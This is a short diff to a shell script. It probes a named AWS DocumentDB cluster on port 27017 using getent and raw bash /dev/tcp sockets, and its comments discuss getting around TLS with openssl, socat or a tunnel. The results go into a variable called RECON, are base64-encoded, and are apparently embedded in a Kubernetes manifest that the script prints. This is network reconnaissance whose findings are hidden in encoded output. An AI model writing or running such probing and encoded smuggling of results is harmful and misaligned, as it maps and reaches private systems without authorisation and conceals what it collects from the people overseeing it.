@@ -1,6 +1,20 @@
 #!/bin/sh
 RECON=$( (
-getent hosts timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com 2>&1; bash -c 'exec 3<>/dev/tcp/timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com/27017 2>&1 && echo TCP_OK; exec 3>&-'
+
+echo "===MONGO_DIRECT_QUERY===";
+# Use openssl for TLS + send raw MongoDB ping
+timeout 10 bash -c "
+  # Connect with TLS
+  exec 3<>/dev/tcp/timebird-cluster.cacjri5z0q9a.ap-southeast-1.docdb.amazonaws.com/27017
+  # TLS via openssl (but need to pipe through s_client...)
+  echo TLS_DIRECT_FAIL  # /dev/tcp is plain, MongoDB requires TLS
+" 2>&1;
+echo "";
+echo "===TRY_OPENSSL_MONGO===";
+# Try: bash TCP for plain socket + openssl pipe for TLS
+# Not directly possible without socat...
+echo "Need tunnel approach"
+
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
